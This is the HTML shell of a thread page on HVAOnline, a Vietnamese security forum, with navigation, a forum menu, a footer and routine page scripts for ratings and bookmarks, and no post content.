<a href="http://www.google.com/bookmarks/mark?op=edit&output=popup&bkmk=http://www.hvaonline.net/hvaonline/posts/list/42028.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/google.gif" align="texttop" alt="[google]" title="[google]"></a>
<a href="http://bookmarks.yahoo.com/toolbar/savebm?opener=tb&u=http://www.hvaonline.net/hvaonline/posts/list/42028.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/yahoo.gif" align="texttop" alt="[yahoo]" title="[yahoo]"></a>
<a href="http://technorati.com/faves?add=http://www.hvaonline.net/hvaonline/posts/list/42028.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/technorati.gif" align="texttop" alt="[technorati]" title="[technorati]"></a>
<a href="http://reddit.com/submit?url=http://www.hvaonline.net/hvaonline/posts/list/42028.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/reddit.gif" align="texttop" alt="[reddit]" title="[reddit]"></a>
<a href="http://www.stumbleupon.com/submit?url=http://www.hvaonline.net/hvaonline/posts/list/42028.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/stumbleupon.gif" align="texttop" alt="[stumbleupon]" title="[stumbleupon]"></a></td>
		<td align="right">	<table cellspacing="0" cellpadding="0" border="0">
		<tr>			  
			<td nowrap="nowrap">
				<form action="" name="f" id="f" accept-charset="UTF-8">
					<span class="gensmall">Go to:&nbsp;</span>
					<select onchange="if(this.options[this.selectedIndex].value > 0){ document.location = '/hvaonline/forums/show/'+ this.options[this.selectedIndex].value +'.hva'; }" name="select">
						<option value="0" selected="selected">Select a forum</option>				
							<option value="0">-------------</option>
									<option value="2" >Thông báo từ HVA</option>
									<option value="41" >FAQ - Các câu hỏi thường gặp</option>
									<option value="5" >Góp ý và Hỏi đáp thắc mắc chung</option>
									<option value="6" >Kiểm tra bảo mật</option>
							<option value="0">-------------</option>
									<option value="8" >Thảo luận bảo mật</option>
									<option value="12" selected="selected">Thảo luận thâm nhập</option>
									<option value="28" >Thảo luận virus, trojan, spyware, worm...</option>
									<option value="36" >Thủ thuật reverse engineering</option>
									<option value="13" >Thông tin new bugs và exploits</option>
									<option value="51" >Case Studies</option>
							<option value="0">-------------</option>
									<option value="23" >Thảo luận hệ điều hành Windows</option>
									<option value="24" >Thảo luận hệ điều hành *nix</option>
									<option value="26" >Thảo luận các loại thiết bị máy tính</option>
									<option value="31" >Thảo luận mạng và thiết bị mạng</option>
									<option value="27" >Thông tin về các địa chỉ và tài liệu hữu ích</option>
							<option value="0">-------------</option>
									<option value="44" >Người tìm việc - Việc tìm người</option>
									<option value="21" >Thảo luận việc định hướng</option>
									<option value="19" >Những thảo luận khác</option>
									<option value="50" >Hình minh họa</option>
									<option value="33" >Trash</option>
							<option value="0">-------------</option>
					</select>
				</form>
			</td>
		</tr>
	</table>
</td>
	</tr>
</table>

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td colspan="3"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="10"></td>
	</tr>
</table>

<!-- list users in -->
<table class="forumline" cellspacing="3" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<th class="thright"  nowrap="nowrap" height="26" valign="middle">&nbsp;Users currently in here&nbsp;</th>
	</tr>
		<tr>
			<td class="gensmall" valign="middle" align="left">
				1 Anonymous 
				
			</td>	
		</tr>
</table>
<a name="quick"></a>

<table cellspacing="0" cellpadding="0" width="100%" border="0"  align="center">

	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.jsp" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
</table>

<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post_show.js"></script>
<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post.js"></script>
<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/avim.js"></script>
<script type="text/javascript">
<!--
function showEmail(beforeAt, afterAt)
{
	return beforeAt + "@" + afterAt;
}

var starOn=new Image();
starOn.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_on.gif";

var starOff=new Image();
starOff.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_off.gif";

function writeStars(q, postId)
{
	for (var i = 0; i < 5; i++) {
		var name = "star" + postId + "_" + i;
		document.write("<img name='" + name + "' alt='*' />");
		document.images[name].src = q > i ? starOn.src : starOff.src;
	}
}

function addBookmark(relationType, relationId)
{
	var w = window.open('/hvaonline/bookmarks/insert/' + relationType + '/' + relationId + '.hva', 'bookmark_add', 'width="700", height="100", scrollbars="no"');
	w.focus();
}

function supportAjax()
{
	if (typeof(AjaxUtils) != 'undefined') {
		if (window.ActiveXObject) {
			var r = new ActiveXObject("Microsoft.XMLHTTP");
			return r != undefined;
		}
		else if (window.XMLHttpRequest) {
			return true;
		}
	}

	return false;
}




function maxImg(foto, maxSize){
w = foto.width;
if (w > maxSize){
	foto.width = maxSize;
	}
} 

-->
</script>
